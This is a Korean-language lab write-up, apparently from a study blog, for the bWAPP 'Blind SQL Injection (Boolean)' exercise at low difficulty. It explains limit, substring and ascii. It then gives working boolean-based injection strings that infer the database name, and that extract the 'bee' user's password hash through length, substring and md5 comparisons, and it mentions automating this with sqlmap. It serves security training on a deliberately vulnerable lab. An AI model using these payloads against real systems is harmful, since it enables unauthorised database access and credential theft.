## SQL Injection - Blind - Boolean-Based

![vmware_zUhP7u2W5f](https://user-images.githubusercontent.com/79683414/135957666-4ddddd99-bd9b-45c0-819c-b15170f361b5.png)

![vmware_rPdS8YZ1oq](https://user-images.githubusercontent.com/79683414/135957962-33b6ebf2-103f-4692-a41a-6a12135840e2.png)

<br>

페이지를 살펴보니 movie 를 seaerch 하면 DB에 해당 movie 가 있는지 없는지 확인해 주는 기능을 하는 것 같다. 이전 문제들 처럼 데이터를 직접적으로 노출 시킬 수 없다 보니 '임의의 Query 를 입력하고 출력되는 참/거짓 값'으로 데이터를 추측해 나가는 방법을 이용해야한다. 흔히 Blind SQL Injection 이라 한다.

<br><br>

## Blind SQL Injection(Boolean)?

Injection 과 그에 대한 Boolean 결과 값으로 데이터를 추측하는 기법으로 자주 사용되는 4가지 함수가 있다. 

- limit
- substring
- ascii

<br><br>

__limit [row_count], [offset]__

limit 은 행 단위로 선택하는 함수이다. row_count 부터 offset 만큼 결과를 반환한다.

<br>

__substring([str], [str_count], [offset])__

limit 와 같은 맥락, 문자열에서 문자열을 추출한다.  str_count 부터 offset 만큼 결과를 반환한다.

<br>

__ascii( str ) -> int__

문자를 아스키 코드로 변환한다. 필터링을 우회하는 용도로 사용한다.

<br><br>

## low

![vmware_8XRXTAf42c](https://user-images.githubusercontent.com/79683414/135961142-1448377d-5872-45e4-9597-7bff21410214.png)

 ` ' or 1=1 # ` 의 결과가 참으로 출력된다. 그렇다면 아래와 같이 "and ~" 를 이용하면 해당 쿼리의 결과를 통해 데이터를 추측할 수 있을 것이다.

__' or 1=1 and ~~~ #__

<br>

이전에 푼 문제들을 통해 Bee-Box의 DB 명이 bWAPP 인 것을 알고 있다. length() 와 database() 를 이용해서 DB명의 길이를 추즉해보자.

<br>

__' or 1=1 and length(database())=5 #__

![vmware_gNKl1ZBnpE](https://user-images.githubusercontent.com/79683414/135961754-b072288d-a635-4921-a259-4182a7b9196f.png)

<br>

__'or 1=1 and substring(database(), 1, 1)='b' #__

![vmware_u6m4Ted7E7](https://user-images.githubusercontent.com/79683414/135961879-6ed8ae2e-8181-4908-bb8e-da93e6ee8f91.png)

<br>

DB 이름의 길이는 5 , 첫번째 글자는 "b" 인 것으로 확인되었다. 이런 식으로 알고 있는 정보를 바탕으로 데이터를 하나씩 추측해나가면 된다. 

select 문을 이용하면, 오래걸리겠지만, password 의 해쉬 값도 알아낼 수 있다. (DB에 저장되는 password 값은 해쉬값이다.)

<br>

__' or 1=1 and length((select password from users where login='bee'))=3 #__  

__' or 1=1 and substring((select password from users where login='bee'),1,1)='ddfk' #__ 

<br>

아래와 같이 해쉬 함수도 사용이 가능하다.

__' or 1=1 and md5("bug")=(select password from users where login='bee') #__

<br><br>
이런 번거로운 과정을 대신해주기 위해 「프로그램」이라는 것이 존재한다. Super Great 한 `sqlmap` 을 이용하면 위에서 사용한 것과 같은 인젝션을 수행하여 DB 정보를 알아낸다. ~~~sqlmap을 사용해도 시간이 좀 걸린다 ㄷㄷ~~~

![vmware_GJZudisF2q](https://user-images.githubusercontent.com/79683414/135964181-d10f7bf8-d56c-404e-b9b0-b1c019ca8a1c.png)
![vmware_L4WUoLiojM](https://user-images.githubusercontent.com/79683414/135964184-d8d74e68-b7d5-416d-9af9-334baa680c72.png)

